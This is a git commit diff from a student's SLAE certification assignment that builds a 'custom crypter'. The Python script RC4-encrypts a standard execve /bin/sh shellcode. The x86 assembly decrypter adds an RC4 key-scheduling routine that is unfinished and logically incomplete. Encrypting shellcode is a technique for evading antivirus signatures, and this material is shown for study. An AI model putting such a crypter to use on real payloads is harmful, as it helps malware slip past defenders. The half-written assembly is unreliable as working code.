f75362373486995251683c1dead3d13762d3da9d
aus-mate <seanfvt@gmail.com>
2020-09-01 21:51:45 +0100

    saving work

--- assignment-7-custom_crypter/decrypter.nasm
+++ assignment-7-custom_crypter/decrypter.nasm
@@ -8,3 +8,40 @@ global _start
 section .text
 
 _start:
+
+	;void rc4_init(unsigned char *key, unsigned int key_length) {
+    	;	for (i = 0; i < 256; i++)
+  	;      		S[i] = i;
+ 	;
+    	;	for (i = j = 0; i < 256; i++) {
+        ;		j = (j + key[i % key_length] + S[i]) & 255;
+        ;		swap(S, i, j);
+    	;	}
+    	;	i = j = 0;
+	;}
+
+	; edi point to S array
+	; ebx will be j
+	; ecx will be a counter
+	; edx is i
+
+	
+	xor ecx, ecx		; clear ecx
+	mov cl, 0xff		; store 256 in ecx for loop
+	inc ecx
+	xor edx, edx		; clear edx
+	mov edi, esp		; point edi at the S array
+	dec ebx
+s_arr:	
+	mov byte[esp-1], dl	; push bytes onto the stack to populate S array
+	dec esp			; adjust stack
+	inc edx			; increment edx
+	loop s_arr		; loop for (i = 0; i < 256; i++)
+	mov ecx, edx		; move 256 into ecx for next loop
+
+	xor edx, edx		; clear edx
+	xor ebx, ebx		; clear ebx
+swap:
+	add ebx, ebx		; + j
+		
+	loop swap		; loop for (i = j = 0; i < 256; i++)			
--- assignment-7-custom_crypter/encrypter.py
+++ assignment-7-custom_crypter/encrypter.py
@@ -5,25 +5,21 @@ Author:     aus-mate
 Purpose:    This code was written for assignment #7 of the SecurityTube Linux Assembly Expert certification.
 Student ID: SLAE-1555
 '''
-from Crypto.Cipher import AES
+from Crypto.Cipher import ARC4
 from os import urandom
 
-shellcode = bytearray("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80", 'ISO-8859-1')
+shellcode = bytes("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80", 'ISO-8859-1')
 
 print ("\nOriginal: " + "".join("0x%02x," % i for i in shellcode))
 
-while (len(shellcode) % 16):
-        shellcode += b'\x90'
+key = urandom(256)
+enc_cipher = ARC4.new(key)
 
-aes_key = urandom(16)
-init_vec = urandom(16)
-enc_cipher = AES.new(aes_key, AES.MODE_CBC, init_vec)
-dec_cipher = AES.new(aes_key, AES.MODE_CBC, init_vec)
+dec_cipher = ARC4.new(key)
 
 enc_shellcode = enc_cipher.encrypt(shellcode)
-print("\nKey: " + "".join("0x%02x," % i for i in aes_key))
-print("\nIV: " + "".join("0x%02x," % i for i in init_vec))
+print("\nKey: " + "".join("0x%02x," % i for i in key))
 print("\nEncrypted: " + "".join("0x%02x," % i for i in enc_shellcode))
 
-# dec_shellcode = dec_cipher.decrypt(enc_shellcode)
-# print("\nDecrypted: " + "".join("0x%02x," % i for i in dec_shellcode))
+dec_shellcode = dec_cipher.decrypt(enc_shellcode)
+print("\nDecrypted: " + "".join("0x%02x," % i for i in dec_shellcode))
